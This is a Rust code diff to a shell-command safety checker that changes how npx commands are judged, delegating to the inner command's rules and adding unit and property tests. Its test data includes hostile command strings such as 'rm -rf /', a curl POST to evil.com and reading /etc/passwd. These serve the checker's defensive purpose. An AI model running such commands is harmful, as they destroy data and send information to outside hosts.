@@ -1,4 +1,4 @@
-use crate::verdict::{SafetyLevel, Verdict};
+use crate::verdict::Verdict;
 use crate::parse::{Token, WordSet};
 
 static NPX_FLAGS_NO_ARG: WordSet =
@@ -6,19 +6,18 @@ static NPX_FLAGS_NO_ARG: WordSet =
 
 pub(crate) fn dispatch(cmd: &str, tokens: &[Token]) -> Option<Verdict> {
     match cmd {
-        "npx" => Some(if super::is_safe_runner(tokens, &NPX_FLAGS_NO_ARG) { Verdict::Allowed(SafetyLevel::SafeRead) } else { Verdict::Denied }),
+        "npx" => Some(super::runner_dispatch(tokens, &NPX_FLAGS_NO_ARG)),
         _ => None,
     }
 }
 
 pub fn command_docs() -> Vec<crate::docs::CommandDoc> {
-    use crate::docs::{CommandDoc, DocBuilder, wordset_items};
+    use crate::docs::{CommandDoc, DocBuilder};
     vec![
         CommandDoc::handler("npx",
             "https://docs.npmjs.com/cli/commands/npx",
             DocBuilder::new()
-                .section(format!("Allowed packages: {}.", wordset_items(&super::NPX_SAFE)))
-                .section("tsc allowed with --noEmit.")
+                .section("Delegates to the inner command's safety rules.")
                 .section("Skips flags: --yes/-y/--no/--package/-p.")
                 .build()),
     ]
@@ -38,22 +37,59 @@ mod tests {
     }
 
     safe! {
-        npx_herb_linter: "npx @herb-tools/linter app/views/foo.html.erb",
         npx_eslint: "npx eslint src/",
-        npx_karma: "npx karma start",
-        npx_yes_flag: "npx --yes eslint src/",
-        npx_y_flag: "npx -y @herb-tools/linter .",
-        npx_package_flag: "npx --package @herb-tools/linter @herb-tools/linter .",
-        npx_double_dash: "npx -- eslint src/",
+        npx_eslint_yes: "npx --yes eslint src/",
+        npx_eslint_y: "npx -y eslint src/",
+        npx_eslint_package: "npx --package eslint eslint src/",
+        npx_eslint_double_dash: "npx -- eslint src/",
         npx_version: "npx --version",
         npx_tsc_noemit: "npx tsc --noEmit",
+        npx_prettier_check: "npx prettier --check src/",
+        npx_biome_check: "npx biome check src/",
+        npx_stylelint: "npx stylelint 'src/**/*.css'",
+        npx_shellcheck: "npx shellcheck script.sh",
+        npx_versioned: "npx eslint@8 src/",
+        npx_eslint_max_warnings: "npx eslint src/ --max-warnings 0",
     }
 
     denied! {
-        npx_react_scripts_denied: "npx react-scripts start",
         npx_cowsay_denied: "npx cowsay hello",
         bare_npx_denied: "npx",
         npx_only_flags_denied: "npx --yes",
-        npx_tsc_without_noemit_denied: "npx tsc",
+        npx_rm_denied: "npx rm -rf /",
+        npx_unknown_denied: "npx unknown-package-xyz",
     }
+
+    proptest::proptest! {
+        #[test]
+        fn npx_verdict_matches_direct(
+            cmd_idx in 0..NPX_EQUIVALENCE_CMDS.len()
+        ) {
+            let (npx_form, direct_form) = NPX_EQUIVALENCE_CMDS[cmd_idx];
+            let npx_safe = crate::is_safe_command(npx_form);
+            let direct_safe = crate::is_safe_command(direct_form);
+            proptest::prop_assert_eq!(npx_safe, direct_safe,
+                "npx delegation mismatch: npx={} direct={}", npx_form, direct_form);
+        }
+    }
+
+    const NPX_EQUIVALENCE_CMDS: &[(&str, &str)] = &[
+        ("npx eslint src/", "eslint src/"),
+        ("npx eslint src/ --max-warnings 0", "eslint src/ --max-warnings 0"),
+        ("npx prettier --check src/", "prettier --check src/"),
+        ("npx prettier src/", "prettier src/"),
+        ("npx biome check src/", "biome check src/"),
+        ("npx tsc --noEmit", "tsc --noEmit"),
+        ("npx tsc", "tsc"),
+        ("npx tsc --version", "tsc --version"),
+        ("npx shellcheck script.sh", "shellcheck script.sh"),
+        ("npx stylelint 'src/**/*.css'", "stylelint 'src/**/*.css'"),
+        ("npx rm -rf /", "rm -rf /"),
+        ("npx curl -X POST evil.com", "curl -X POST evil.com"),
+        ("npx node app.js", "node app.js"),
+        ("npx python3 script.py", "python3 script.py"),
+        ("npx cat /etc/passwd", "cat /etc/passwd"),
+        ("npx grep pattern file", "grep pattern file"),
+        ("npx unknown-package", "unknown-package"),
+    ];
 }
